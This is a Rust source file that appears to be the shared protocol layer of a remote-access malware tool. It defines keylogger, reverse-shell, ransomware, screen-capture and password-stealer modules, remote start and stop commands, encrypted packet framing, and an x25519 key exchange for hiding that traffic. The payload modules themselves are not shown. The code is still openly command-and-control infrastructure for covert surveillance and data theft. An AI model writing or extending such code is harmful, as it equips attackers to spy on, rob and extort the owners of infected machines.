use std::sync::Arc;

use aes_gcm::{aead::{AeadMut, OsRng}, AeadCore, Aes256Gcm, KeyInit};
use hkdf::Hkdf;
use tokio::{io::{AsyncReadExt, AsyncWriteExt}, net::tcp::{OwnedReadHalf, OwnedWriteHalf}, sync::Mutex};
use x25519_dalek::{EphemeralSecret, PublicKey};


pub trait PacketMethods {
    fn pack(&self) -> Vec<u8>;
    fn packet_type(&self) -> PacketType;
}

#[repr(u8)]
pub enum ShutDownType {
    Successful,
    Panic,
}

#[repr(u8)]

#[derive(Clone, Copy)]
pub enum StatusType {
    Active,
    Stopped
}
#[repr(u8)]
#[derive(Clone, Copy, Debug, Hash, PartialEq, Eq)]
pub enum ModuleType {
    KeyLogger,
    ReverseShell,
    RansomWare,
    Capture,
    PaswStealer
}
#[repr(u8)]
#[derive(Clone, Copy, Debug)]
pub enum ControlCode {
    Start,
    Stop,
}
#[repr(u8)]
pub enum PacketType {
    Control,
    Data,
}

impl TryFrom<u8> for ModuleType {
    type Error = std::io::Error;

    fn try_from(value: u8) -> Result<Self, Self::Error> {
        return match value {
            0 => Ok(ModuleType::KeyLogger),
            1 => Ok(ModuleType::ReverseShell),
            2 => Ok(ModuleType::RansomWare),
            3 => Ok(ModuleType::Capture),
            4 => Ok(ModuleType::PaswStealer),
            _ => Err(std::io::Error::from(std::io::ErrorKind::InvalidData))
        }
    }
}

impl TryFrom<u8> for PacketType {
    type Error = std::io::Error;

    fn try_from(value: u8) -> Result<Self, Self::Error> {
        return match value {
            0 => Ok(PacketType::Control),
            1 => Ok(PacketType::Data),
            _ => Err(std::io::Error::from(std::io::ErrorKind::InvalidData))
        }
    }
}

impl TryFrom<u8> for ControlCode {
    type Error = std::io::Error;

    fn try_from(value: u8) -> Result<Self, Self::Error> {
        return match value {
            0 => Ok(ControlCode::Start),
            1 => Ok(ControlCode::Stop),
            _ => Err(std::io::Error::from(std::io::ErrorKind::InvalidData))
        }
    }
}

/* 
module sync packet structure:
    [255 byte array], bit is set for each module
    e.g for module enum 3, the 4th byte is set to 3, 
        for module enum 0, the 1st byte set to 0,
        byte set to 255 for no module

packet structure: 
[nonce][lengthof cipher][   ciphertext   ]
(datapacket)            [packettype][moduletype][data]
(control packet)        [packettype][moduletype][control code]

control packet = 0
data packet = 1
*/
#[derive(Clone)]
pub struct DataPacket {
    pub module_type: ModuleType,
    pub data: Vec<u8>,
}

pub struct ControlPacket {
    pub module_type: ModuleType,
    pub control_code: ControlCode
}

impl PacketMethods for DataPacket {

    fn packet_type(&self) -> PacketType {
        PacketType::Data
    }
    
    fn pack(&self) -> Vec<u8> {
        let mut ret = vec![];
        ret.push(self.module_type as u8);
        ret.extend(&self.data);
        ret
    }
}

impl DataPacket {
    pub fn from_bytes(bytes: &[u8]) -> std::io::Result<Self> {
        Ok(Self {
            module_type: bytes[0].try_into()?,
            data: bytes[1..].into()
        })
    }
}

impl PacketMethods for ControlPacket {

    fn packet_type(&self) -> PacketType {
        PacketType::Control    
    }

    fn pack(&self) -> Vec<u8> {
        let mut ret = vec![];
        ret.push(self.module_type as u8);
        ret.push(self.control_code as u8);
        ret
    }
}
impl ControlPacket {

    pub fn from_bytes(bytes: &[u8]) -> std::io::Result<Self> {
        Ok(Self {
            module_type: ModuleType::try_from(bytes[0])?,
            control_code: bytes[1].try_into()?
        })
    }
}

pub async fn encrypted_write_from_key(writer: Arc<Mutex<OwnedWriteHalf>>, key: &[u8 ;32], data: impl PacketMethods) -> Result<(), std::io::Error> {
    let nonce = Aes256Gcm::generate_nonce(OsRng);
    let mut cipher = Aes256Gcm::new(key.into());
    let mut plaintext = vec![data.packet_type() as u8];
    plaintext.extend(data.pack());
    let ciphertext = cipher.encrypt(&nonce, &plaintext[..]).unwrap();
    let mut write_buff: Vec<u8> = vec![];
    write_buff.extend_from_slice(nonce.as_slice());
    write_buff.extend((ciphertext.len() as u64).to_be_bytes());
    write_buff.extend(ciphertext);
    let mut writer = writer.lock().await;
    writer.write(&write_buff).await?;
    //writer.flush().await?;
    Ok(())
}


pub async fn acquire_key(read: &mut OwnedReadHalf, write: &mut OwnedWriteHalf) -> Result<[u8; 32], std::io::Error>{
    let client_secret = EphemeralSecret::random_from_rng(OsRng);   
    let client_public = PublicKey::from(&client_secret);
    let mut server_public = [0; 32];
    write.write_all(client_public.as_bytes()).await?;
    read.read_exact(&mut server_public).await?;
    let shared_secret = client_secret.diffie_hellman(&server_public.into());
    Ok(*shared_secret.as_bytes())
}







